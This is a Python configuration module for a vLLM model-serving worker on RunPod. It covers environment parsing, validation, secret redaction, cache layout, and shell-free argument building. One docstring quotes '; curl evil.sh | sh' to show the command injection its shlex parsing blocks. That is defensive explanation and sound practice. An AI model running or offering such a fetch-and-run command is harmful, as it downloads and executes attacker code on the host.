"""Runtime configuration, read once from the environment.

Every value that changes behaviour is named here and nowhere else, so an
operator can see the whole contract in one file and a typo fails at boot rather
than half an hour into a download.

Secrets are held in a wrapper that refuses to render itself. Printing a config
object is something people do while debugging at 3am; it must not be the way a
Hugging Face token reaches a log aggregator.
"""

from __future__ import annotations

import os
import shlex
from collections.abc import Mapping, Sequence
from dataclasses import dataclass, field
from pathlib import Path

__all__ = [
    "ConfigError",
    "PersistentLayout",
    "Secret",
    "WorkerConfig",
]

# The model is 31.2 GB on 4 shards. A volume sized to the weights alone will
# fail the first time a revision changes or a download resumes, so the default
# floor leaves room for one in-flight download on top of one resident snapshot.
DEFAULT_MIN_FREE_DISK_GB = 60.0

DEFAULT_MODEL_ID = "Qwen/Qwen3-Coder-30B-A3B-Instruct-FP8"
DEFAULT_PERSISTENT_ROOT = "/runpod-volume"

# Below this a context is not worth serving: the coder prompts alone carry more.
MIN_USABLE_MODEL_LEN = 1024
MAX_TCP_PORT = 65535


class ConfigError(RuntimeError):
    """Configuration that cannot work. Raised at boot, never mid-flight."""

    def __init__(self, message: str, *, variable: str | None = None, hint: str | None = None):
        super().__init__(message)
        self.variable = variable
        self.hint = hint

    def render(self) -> str:
        """Operator-facing text: what is wrong, where, and what to do."""
        lines = [f"configuration error: {self}"]
        if self.variable:
            lines.append(f"  variable: {self.variable}")
        if self.hint:
            lines.append(f"  fix:      {self.hint}")
        return "\n".join(lines)


class Secret:
    """A value that never appears in a repr, a log line or a traceback."""

    __slots__ = ("_value",)

    def __init__(self, value: str | None) -> None:
        self._value = value or ""

    def __bool__(self) -> bool:
        return bool(self._value)

    def reveal(self) -> str:
        """Explicit at the one call site that actually needs the bytes."""
        return self._value

    def __repr__(self) -> str:
        return "Secret(set)" if self._value else "Secret(unset)"

    __str__ = __repr__


@dataclass(frozen=True, slots=True)
class PersistentLayout:
    """Where everything large lives. All of it on the mounted volume.

    Keeping these paths together is what makes the rule auditable: if a
    directory is not derived from ``root``, it is a bug.
    """

    root: Path

    @property
    def models(self) -> Path:
        return self.root / "models"

    @property
    def huggingface(self) -> Path:
        return self.root / "huggingface"

    @property
    def hub_cache(self) -> Path:
        return self.huggingface / "hub"

    @property
    def vllm_cache(self) -> Path:
        return self.root / "vllm"

    @property
    def torch_home(self) -> Path:
        return self.root / "torch"

    @property
    def tmp(self) -> Path:
        return self.root / "tmp"

    @property
    def state(self) -> Path:
        return self.root / "state"

    @property
    def logs(self) -> Path:
        return self.root / "logs"

    @property
    def xdg_cache(self) -> Path:
        return self.root / "xdg"

    @property
    def model_ready_marker(self) -> Path:
        return self.state / "model-ready.json"

    @property
    def download_lock(self) -> Path:
        return self.state / "model-download.lock"

    def all_directories(self) -> tuple[Path, ...]:
        return (
            self.models,
            self.huggingface,
            self.hub_cache,
            self.vllm_cache,
            self.torch_home,
            self.tmp,
            self.state,
            self.logs,
            self.xdg_cache,
        )

    def environment(self) -> dict[str, str]:
        """The cache variables every downstream library must inherit.

        Exported before anything imports torch or huggingface_hub: both read
        these at import time, and a late export silently writes gigabytes into
        the container filesystem instead.
        """
        return {
            "HF_HOME": str(self.huggingface),
            "HUGGINGFACE_HUB_CACHE": str(self.hub_cache),
            "HF_HUB_CACHE": str(self.hub_cache),
            "VLLM_CACHE_ROOT": str(self.vllm_cache),
            "TORCH_HOME": str(self.torch_home),
            "TMPDIR": str(self.tmp),
            "XDG_CACHE_HOME": str(self.xdg_cache),
            "TRITON_CACHE_DIR": str(self.vllm_cache / "triton"),
        }


@dataclass(frozen=True, slots=True)
class WorkerConfig:
    """Everything the worker reads from its environment."""

    # -- model ----------------------------------------------------------
    model_id: str = DEFAULT_MODEL_ID
    model_revision: str | None = None
    served_model_name: str | None = None

    # -- storage --------------------------------------------------------
    persistent_root: Path = Path(DEFAULT_PERSISTENT_ROOT)
    min_free_disk_gb: float = DEFAULT_MIN_FREE_DISK_GB

    # -- serving --------------------------------------------------------
    host: str = "0.0.0.0"  # noqa: S104 - a container must bind every interface
    port: int = 8000
    max_model_len: int = 16384
    gpu_memory_utilization: float = 0.90
    tensor_parallel_size: int = 1
    auto_tensor_parallel: bool = False
    extra_args: tuple[str, ...] = ()

    # -- timings --------------------------------------------------------
    readiness_timeout_seconds: float = 1800.0
    readiness_poll_seconds: float = 3.0
    download_max_attempts: int = 5
    download_backoff_seconds: float = 5.0
    lock_timeout_seconds: float = 7200.0

    # -- hub ------------------------------------------------------------
    hf_hub_disable_xet: bool | None = None

    # -- secrets --------------------------------------------------------
    hf_token: Secret = field(default_factory=lambda: Secret(None))
    vllm_api_key: Secret = field(default_factory=lambda: Secret(None))

    def __post_init__(self) -> None:
        if not self.model_id.strip():
            raise ConfigError("MODEL_ID must not be empty", variable="MODEL_ID")
        if not 0 < self.gpu_memory_utilization <= 1:
            raise ConfigError(
                f"GPU_MEMORY_UTILIZATION must be within (0, 1], got {self.gpu_memory_utilization}",
                variable="GPU_MEMORY_UTILIZATION",
                hint="0.90 leaves room for the CUDA context and activations",
            )
        if self.max_model_len < MIN_USABLE_MODEL_LEN:
            raise ConfigError(
                f"MAX_MODEL_LEN must be at least {MIN_USABLE_MODEL_LEN}, got {self.max_model_len}",
                variable="MAX_MODEL_LEN",
            )
        if self.tensor_parallel_size < 1:
            raise ConfigError(
                "TENSOR_PARALLEL_SIZE must be at least 1",
                variable="TENSOR_PARALLEL_SIZE",
            )
        if not 1 <= self.port <= MAX_TCP_PORT:
            raise ConfigError(f"PORT must be a valid port, got {self.port}", variable="PORT")
        if self.min_free_disk_gb < 0:
            raise ConfigError("MIN_FREE_DISK_GB must not be negative", variable="MIN_FREE_DISK_GB")
        if not self.persistent_root.is_absolute():
            raise ConfigError(
                f"PERSISTENT_ROOT must be an absolute path, got {self.persistent_root}",
                variable="PERSISTENT_ROOT",
                hint="RunPod mounts network volumes at /runpod-volume",
            )

    # -- derived --------------------------------------------------------
    @property
    def layout(self) -> PersistentLayout:
        return PersistentLayout(self.persistent_root)

    @property
    def base_url(self) -> str:
        """Where the local vLLM listens, as seen from inside the container."""
        host = "127.0.0.1" if self.host in ("0.0.0.0", "::") else self.host  # noqa: S104
        return f"http://{host}:{self.port}"

    @property
    def public_model_name(self) -> str:
        """What clients must send as ``model``."""
        return self.served_model_name or self.model_id

    def hub_environment(self) -> dict[str, str]:
        """Cache and transfer settings for huggingface_hub."""
        env = dict(self.layout.environment())
        if self.hf_hub_disable_xet is not None:
            env["HF_HUB_DISABLE_XET"] = "1" if self.hf_hub_disable_xet else "0"
        if self.hf_token:
            env["HF_TOKEN"] = self.hf_token.reveal()
        return env

    # -- vLLM argv ------------------------------------------------------
    def vllm_argv(self, model_path: str | Path | None = None) -> list[str]:
        """The exact argument vector used to launch vLLM.

        Built explicitly rather than assembled into a string and passed through
        a shell: an environment variable must never be able to inject a command.
        ``extra_args`` is parsed with ``shlex`` at config time, so what lands
        here is already a list of words, not a fragment to be interpreted.
        """
        target = str(model_path) if model_path is not None else self.model_id
        argv = [
            "vllm",
            "serve",
            target,
            "--host",
            self.host,
            "--port",
            str(self.port),
            "--served-model-name",
            self.public_model_name,
            "--max-model-len",
            str(self.max_model_len),
            "--gpu-memory-utilization",
            f"{self.gpu_memory_utilization:g}",
            "--tensor-parallel-size",
            str(self.tensor_parallel_size),
        ]
        if model_path is None and self.model_revision:
            # A local snapshot already *is* the revision; asking vLLM to resolve
            # one again would send it back to the hub for no reason.
            argv += ["--revision", self.model_revision]
        if self.vllm_api_key:
            argv += ["--api-key", self.vllm_api_key.reveal()]
        argv += list(self.extra_args)
        return argv

    def redacted_argv(self, model_path: str | Path | None = None) -> list[str]:
        """The same vector, safe to log."""
        argv = self.vllm_argv(model_path)
        if self.vllm_api_key:
            index = argv.index("--api-key")
            argv[index + 1] = "***"
        return argv

    # -- construction ---------------------------------------------------
    @classmethod
    def from_env(cls, environ: Mapping[str, str] | None = None) -> WorkerConfig:
        env = os.environ if environ is None else environ
        return cls(
            model_id=_text(env, "MODEL_ID", DEFAULT_MODEL_ID),
            model_revision=_optional(env, "MODEL_REVISION"),
            served_model_name=_optional(env, "SERVED_MODEL_NAME"),
            persistent_root=Path(_text(env, "PERSISTENT_ROOT", DEFAULT_PERSISTENT_ROOT)),
            min_free_disk_gb=_number(env, "MIN_FREE_DISK_GB", DEFAULT_MIN_FREE_DISK_GB),
            host=_text(env, "HOST", "0.0.0.0"),  # noqa: S104
            port=_integer(env, "PORT", 8000),
            max_model_len=_integer(env, "MAX_MODEL_LEN", 16384),
            gpu_memory_utilization=_number(env, "GPU_MEMORY_UTILIZATION", 0.90),
            tensor_parallel_size=_integer(env, "TENSOR_PARALLEL_SIZE", 1),
            auto_tensor_parallel=_flag(env, "AUTO_TENSOR_PARALLEL", default=False),
            extra_args=_words(env, "VLLM_EXTRA_ARGS"),
            readiness_timeout_seconds=_number(env, "READINESS_TIMEOUT_SECONDS", 1800.0),
            readiness_poll_seconds=_number(env, "READINESS_POLL_SECONDS", 3.0),
            download_max_attempts=_integer(env, "MODEL_DOWNLOAD_MAX_ATTEMPTS", 5),
            download_backoff_seconds=_number(env, "MODEL_DOWNLOAD_BACKOFF_SECONDS", 5.0),
            lock_timeout_seconds=_number(env, "MODEL_LOCK_TIMEOUT_SECONDS", 7200.0),
            hf_hub_disable_xet=_optional_flag(env, "HF_HUB_DISABLE_XET"),
            hf_token=Secret(env.get("HF_TOKEN") or env.get("HUGGING_FACE_HUB_TOKEN")),
            vllm_api_key=Secret(env.get("VLLM_API_KEY")),
        )

    def describe(self) -> list[str]:
        """Startup banner. Contains no secret, by construction."""
        return [
            f"model                  {self.model_id}",
            f"revision               {self.model_revision or 'unpinned (resolves to main)'}",
            f"served as              {self.public_model_name}",
            f"persistent root        {self.persistent_root}",
            f"listen                 {self.host}:{self.port}",
            f"max model len          {self.max_model_len}",
            f"gpu memory utilisation {self.gpu_memory_utilization:g}",
            f"tensor parallel        {self.tensor_parallel_size}"
            + (" (auto)" if self.auto_tensor_parallel else ""),
            f"min free disk          {self.min_free_disk_gb:g} GB",
            f"api key                {'set' if self.vllm_api_key else 'NOT SET (open port)'}",
            f"hf token               {'set' if self.hf_token else 'not set'}",
        ]


# ----------------------------------------------------------------------
# parsing helpers: every failure names the variable and the offending value
# ----------------------------------------------------------------------
def _text(env: Mapping[str, str], name: str, default: str) -> str:
    value = env.get(name)
    return default if value is None or not value.strip() else value.strip()


def _optional(env: Mapping[str, str], name: str) -> str | None:
    value = env.get(name)
    return value.strip() if value and value.strip() else None


def _integer(env: Mapping[str, str], name: str, default: int) -> int:
    raw = _optional(env, name)
    if raw is None:
        return default
    try:
        return int(raw)
    except ValueError as exc:
        raise ConfigError(f"{name} must be an integer, got {raw!r}", variable=name) from exc


def _number(env: Mapping[str, str], name: str, default: float) -> float:
    raw = _optional(env, name)
    if raw is None:
        return default
    try:
        return float(raw)
    except ValueError as exc:
        raise ConfigError(f"{name} must be a number, got {raw!r}", variable=name) from exc


_TRUE = frozenset({"1", "true", "yes", "on"})
_FALSE = frozenset({"0", "false", "no", "off"})


def _flag(env: Mapping[str, str], name: str, *, default: bool) -> bool:
    result = _optional_flag(env, name)
    return default if result is None else result


def _optional_flag(env: Mapping[str, str], name: str) -> bool | None:
    raw = _optional(env, name)
    if raw is None:
        return None
    lowered = raw.lower()
    if lowered in _TRUE:
        return True
    if lowered in _FALSE:
        return False
    raise ConfigError(
        f"{name} must be a boolean, got {raw!r}",
        variable=name,
        hint="accepted: 1/0, true/false, yes/no, on/off",
    )


def _words(env: Mapping[str, str], name: str) -> tuple[str, ...]:
    """Split extra arguments safely.

    ``shlex`` honours quoting but expands nothing: no globbing, no command
    substitution, no variable expansion. An operator can pass
    ``--enable-prefix-caching`` but not ``; curl evil.sh | sh``.
    """
    raw = _optional(env, name)
    if raw is None:
        return ()
    try:
        return tuple(shlex.split(raw))
    except ValueError as exc:
        raise ConfigError(
            f"{name} is not a valid argument list: {exc}",
            variable=name,
            hint='quote values containing spaces, e.g. --foo "a b"',
        ) from exc


def resolve_tensor_parallel(config: WorkerConfig, visible_gpus: Sequence[object]) -> int:
    """Decide the tensor-parallel degree.

    Auto mode is opt-in on purpose. Combining every visible GPU by default would
    silently turn two independently schedulable workers into one, which is the
    opposite of how this fleet scales: the orchestrator adds Pods, it does not
    widen them.
    """
    if not config.auto_tensor_parallel:
        return config.tensor_parallel_size
    count = len(visible_gpus)
    return max(count, 1)
